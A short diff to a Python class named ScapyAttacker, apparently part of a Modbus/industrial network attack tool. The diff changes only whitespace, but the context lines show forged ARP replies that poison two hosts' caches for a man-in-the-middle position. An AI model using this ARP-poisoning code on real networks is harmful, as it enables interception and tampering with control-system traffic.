@@ -3,7 +3,6 @@ import argparse
 from matplotlib.backends.backend_pdf import Reference
 from scapy.layers.inet import IP
 from scapy.layers.l2 import ARP, Ether
-
 from ModbusPackets import *
 from NetworkNode import NetworkNode
 from ModbusCommand import ModbusCommand
@@ -43,6 +42,7 @@ class ScapyAttacker:
         print("Poisoning {} <==> {} .... started".format(src.IP, dst.IP), end='')
         gateway_to_target = ARP(op=2, hwdst=src.MAC, psrc=dst.IP, pdst=src.IP)
         target_to_gateway = ARP(op=2, hwdst=dst.MAC, psrc=src.IP, pdst=dst.IP)
+    
         try:
             send(gateway_to_target, count=ScapyAttacker.ARP_MSG_CNT, verbose=0)
             send(target_to_gateway, count=ScapyAttacker.ARP_MSG_CNT, verbose=0)
